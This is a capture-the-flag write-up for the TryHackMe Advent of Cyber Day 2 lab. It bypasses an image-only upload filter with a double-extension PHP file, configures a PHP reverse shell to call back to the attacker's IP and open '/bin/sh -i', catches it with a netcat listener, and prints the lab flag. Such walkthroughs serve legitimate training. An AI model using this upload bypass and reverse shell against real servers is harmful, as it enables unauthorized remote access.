# IP

`10.10.140.172`

# What string of text needs to be added to the URL to get access to the upload page?

```http://10.10.140.172/?id=ODIzODI5MTNiYmYw ```

# What type of file is accepted by the site?

We can check it in source of opened website

```accept=".jpeg,.jpg,.png"```

As suggested in description, I create a reverse php file ```shell.jpeg.php```:

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.2.127.255';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Where `$ip` stands for IP of `tun0`

# In which directory are the uploaded files stored?

We can try standard names as ```/uploads/``` which works in this case

# Activate your reverse shell and catch it in a netcat listener!

```sudo nc -lvnp 443```

It will activate as soon as reverse shell php is activated.

# What is the flag in /var/www/flag.txt?

I navigate to a directory and get a flag

```
You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)
```

# IT WAS REALLY FUN !!
